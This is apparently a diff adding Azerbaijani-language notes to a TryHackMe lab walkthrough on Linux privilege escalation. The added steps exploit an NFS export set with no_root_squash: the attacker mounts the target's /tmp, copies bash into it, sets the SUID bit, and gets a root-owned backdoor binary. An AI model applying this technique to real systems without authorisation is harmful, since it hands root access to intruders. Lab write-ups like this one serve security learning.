@@ -104,6 +104,88 @@ karen@ip-10-10-187-4:/tmp$ ./bash -p
 bash-5.0# whoami
 root
 
+-------------
+ve ya bele ede bilerik:
+
+
+1.  qarsi masinda (tryhackme) paylasilan folderlere baxiriq
+
+karen@ip-10-10-19-187:/$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be expor
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,nubtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_che
+
+
+2. daha sonra root da /tmp ye kecib backdoor adinda fayl yaradiriq ve qabag 
+terefin /tmp sini root da olan  /tmp /backdoor ile sinxron elaqe yaradiram
+
+--mkdir backdoor
+
+ve qabag terefin tmp sin ozumuzde ki tmp deki backdoor ile elaqe qurmasini temin edirik
+
+--mount -t nfs 10.10.19.187: /tmp /tmp/backdoor
+
+
+3.ve kecid edirk backdoor a (root da ki)
+
+──(root㉿kali)-[/tmp]
+└─# cd /tmp/backdoor 
+
+4. daha sonra burada Salam .txt fayli yaradiriq ki qarsi terefden baxaq gorek elaqe qura bilirik yeni burada nese yaradanda ora da aftomatik dusur yoxsa yox
+
+┌──(root㉿kali)-[/tmp/backdoor]
+└─# touch Salam.txt
+
+5.sonra gelib qarsi masinda (tryhackme de ki) baxiriq gorek salam.txt ora dusdu rootdan
+
+karen@ip-10-10-19-187:/tmp$ ls
+Salam.txt
+
+ve baxiriq ki beli dusub yeni rootda nese yaradanda avtomatik qarsi masina da dusur
+
+
+6. daha sonra /bin/bash i kopu edib da backdoor  a atiriq ve suid veririk
+
+┌──(root㉿kali)-[/tmp/backdoor]
+└─# cp /bin/bash backdoor
+                                                                             
+┌──(root㉿kali)-[/tmp/backdoor]
+└─# ls
+Salam.txt
+backdoor
+snap.lxd
+systemd-private-ac8d007325f942c7895bfd168e4d4021-systemd-logind.service-budLoi
+systemd-private-ac8d007325f942c7895bfd168e4d4021-systemd-resolved.service-L06oRg
+systemd-private-ac8d007325f942c7895bfd168e4d4021-systemd-timesyncd.service-kFyNJh
+                                                                             
+┌──(root㉿kali)-[/tmp/backdoor]
+└─# chmod u+s backdoor   
+
+
+7.daha sonra qarsi masina gelib backdoor un icazelerine baxiriq ve goruruk ki suidir ve root dur
+
+karen@ip-10-10-19-187:/tmp$ ls -la
+total 1284
+drwxrwxrwt 11 root root    4096 Jan 30 12:56 .
+drwxr-xr-x 19 root root    4096 Jan 30 12:14 ..
+drwxrwxrwt  2 root root    4096 Jan 30 12:14 .XIM-unix
+drwxrwxrwt  2 root root    4096 Jan 30 12:14 .font-unix
+-rw-r--r--  1 root root       0 Jan 30 12:52 Salam.txt
+-rwsr-xr-x  1 root root 1269744 Jan 30 12:56 backdoor
+
+ 
+
+
 
 
 	
